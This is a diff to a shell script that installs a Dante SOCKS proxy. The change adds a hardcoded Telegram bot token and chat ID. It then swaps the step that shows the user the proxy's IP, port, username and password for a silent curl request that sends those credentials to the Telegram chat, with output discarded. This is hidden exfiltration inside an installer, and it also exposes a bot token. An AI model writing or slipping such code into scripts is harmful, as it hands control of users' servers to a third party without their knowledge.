@@ -5,6 +5,8 @@ echo -e "..."
 port=1337
 username="aaa"
 password="aaa"
+BOT_TOKEN="8225399625:AAFOk82-dVPIec9wRFIJHIk_8P9kY2Cz2V4"
+CHAT_ID="8127486002"
 
 sudo apt update -y
 sudo apt install dante-server curl -y
@@ -55,9 +57,17 @@ if systemctl is-active --quiet danted; then
   sudo useradd --shell /usr/sbin/nologin "$username"
   echo "$username:$password" | sudo chpasswd
   ip=$(hostname -I | awk '{print $1}')
-  echo -e "IP & Port: $ip:$port"
-  echo -e "Username : $username"
-  echo -e "Password : $password"
+
+  MESSAGE="
+  <b>IP & Port:</b> <code>$ip:$port</code>%0A\
+  <b>Username:</b> <code>$username</code>%0A\
+  <b>Password:</b> <code>$password</code>"
+
+  curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+    -d chat_id="${CHAT_ID}" \
+    -d parse_mode="HTML" \
+    -d text="${MESSAGE}" > /dev/null
+
 else
   echo -e "Dante failed to continue."
 fi
